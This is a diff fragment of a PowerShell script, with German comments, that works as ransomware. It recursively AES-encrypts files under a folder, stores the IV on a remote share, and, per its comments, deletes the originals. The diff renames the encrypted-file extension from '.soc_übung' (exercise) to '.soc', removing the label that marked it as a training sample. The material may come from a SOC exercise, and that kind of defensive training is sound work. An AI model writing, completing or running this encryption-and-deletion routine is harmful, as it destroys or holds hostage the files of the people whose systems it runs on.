@@ -23,9 +23,9 @@ $ivFile = "\hostname:port\victory\encryptionIV.bin"
 [System.IO.File]::WriteAllBytes($ivFile, $aesManaged.IV)
 
 # verschlüsseln ausgewählte Dateien und orginelle erbeugen, dann orginelle löschen
-Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer -and $_.Extension -ne ".soc_übung" } | ForEach-Object {
+Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer -and $_.Extension -ne ".soc" } | ForEach-Object {
     $inputFile = $_.FullName
-    $outputFile = "$inputFile.soc_übung"
+    $outputFile = "$inputFile.soc"
 
     # auslesen die Inhalte der Datei 
     $content = [System.IO.File]::ReadAllBytes($inputFile)
